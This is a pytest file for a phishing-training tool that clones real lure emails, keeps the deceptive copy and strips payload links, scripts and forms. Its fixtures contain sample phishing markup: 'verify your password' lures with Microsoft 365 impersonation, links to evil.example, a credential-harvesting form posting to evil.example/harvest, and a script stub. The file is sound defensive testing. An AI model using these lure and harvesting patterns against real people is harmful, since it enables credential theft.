"""Clone-a-real-message neutralization: keep the copy, kill the payload.

The whole point of a cloned lure is that it reads like the real campaign — so
the deceptive wording the text SafetyValidator would reject (passwords,
verification codes, "sign in") must survive. Safety comes from neutralizing the
*mechanics*: every link becomes the training placeholder, and scripts/forms/
trackers are stripped. These tests pin exactly that split.
"""

from __future__ import annotations

import pytest
from kp_contracts.generation import TRAINING_URL_PLACEHOLDER
from kp_curation.clone_service import CloneError, clone_real_message


def test_preserves_deceptive_copy_and_neutralizes_the_link() -> None:
    html = (
        "<p>Your mailbox is locked. "
        '<a href="https://evil.example/login">Verify your password now</a></p>'
        "<script>steal()</script>"
    )
    result = clone_real_message(subject="Action required: verify your password", raw_html=html)

    # Deceptive copy kept — this is exactly what the text validator would reject.
    assert "verify your password" in result.plain_text.lower()
    assert "Verify your password now" in result.safe_html  # the anchor TEXT survives
    assert "verify your password" in result.subject.lower()

    # Payload neutralized: no real destination, no script.
    assert "evil.example" not in result.safe_html
    assert "<script" not in result.safe_html.lower()
    assert "steal" not in result.safe_html

    # Exactly the one safe link remains, in both bodies.
    assert TRAINING_URL_PLACEHOLDER in result.safe_html
    assert TRAINING_URL_PLACEHOLDER in result.plain_text
    assert result.provenance["rewritten_links"] == 1


def test_strips_credential_capture_form() -> None:
    html = (
        '<form action="https://evil.example/harvest" method="post">'
        '<label>Password <input type="password" name="pw"></label>'
        "<button>Sign in</button></form>"
    )
    result = clone_real_message(subject="Security alert", raw_html=html)
    assert "<form" not in result.safe_html.lower()
    assert "<input" not in result.safe_html.lower()
    assert "evil.example" not in result.safe_html
    # A safe training link is still guaranteed even though the source had none.
    assert TRAINING_URL_PLACEHOLDER in result.safe_html


def test_injects_training_link_when_source_has_none() -> None:
    result = clone_real_message(subject="Notice", raw_html="<p>Please review the attached invoice.</p>")
    assert TRAINING_URL_PLACEHOLDER in result.safe_html
    assert TRAINING_URL_PLACEHOLDER in result.plain_text
    assert "attached invoice" in result.plain_text.lower()  # copy preserved


def test_neutralizes_bare_urls_in_plain_text() -> None:
    result = clone_real_message(
        subject="Reset",
        raw_html="<p>Reset here.</p>",
        plain_text="Reset your account at https://evil.example/reset immediately.",
    )
    assert "evil.example" not in result.plain_text
    assert TRAINING_URL_PLACEHOLDER in result.plain_text
    assert "reset your account" in result.plain_text.lower()


def test_rejects_empty_input() -> None:
    with pytest.raises(CloneError):
        clone_real_message(subject="", raw_html="<p>x</p>")
    with pytest.raises(CloneError):
        clone_real_message(subject="Subject", raw_html="", plain_text="")


# --- Deterministic cue + transformation manifest (W3-01) ---


def test_reconstruction_emits_cue_and_transformation_manifest() -> None:
    html = (
        "<p>Dear user, your Microsoft 365 account is locked. "
        '<a href="https://evil.example/login">Verify your account now</a></p>'
        "<script>steal()</script>"
    )
    result = clone_real_message(subject="URGENT: verify your account", raw_html=html)
    manifest = result.cue_manifest

    assert manifest["ontology_version"] == "cue-ontology/1"
    assert manifest["source"] == "reconstruction"
    # Known cues were extracted deterministically from the ORIGINAL lure.
    cue_types = {cue["cue_type"] for cue in manifest["cues"]}
    assert {"urgency", "credential_request", "brand_impersonation"} <= cue_types

    # A transformation receipt exists for the neutralized link and the stripped
    # script, each citing a fixed policy reason.
    receipts = {(r["component"], r["policy_reason"]) for r in manifest["transformations"]}
    assert ("anchor_href", "payload_link_removed") in receipts
    assert ("tag:script", "active_content_removed") in receipts


def test_manifest_hashes_the_replaced_link_never_stores_it_raw() -> None:
    html = '<p><a href="https://evil.example/login">Verify</a></p>'
    result = clone_real_message(subject="Verify your account", raw_html=html)
    import json as _json

    serialized = _json.dumps(result.cue_manifest)
    assert "evil.example" not in serialized  # raw destination never persisted
    link_receipt = next(r for r in result.cue_manifest["transformations"] if r["component"] == "anchor_href")
    assert link_receipt["evidence_hashes"]  # hashed original destination recorded
    assert result.cue_manifest["provenance"]["raw_text_retained"] is False


def test_reconstruction_manifest_is_deterministic() -> None:
    import json as _json

    kwargs = {
        "subject": "URGENT: verify your Microsoft 365 password",
        "raw_html": '<p>Click here: <a href="https://evil.example/x">now</a></p>',
    }
    a = clone_real_message(**kwargs).cue_manifest
    b = clone_real_message(**kwargs).cue_manifest
    assert _json.dumps(a, sort_keys=True) == _json.dumps(b, sort_keys=True)
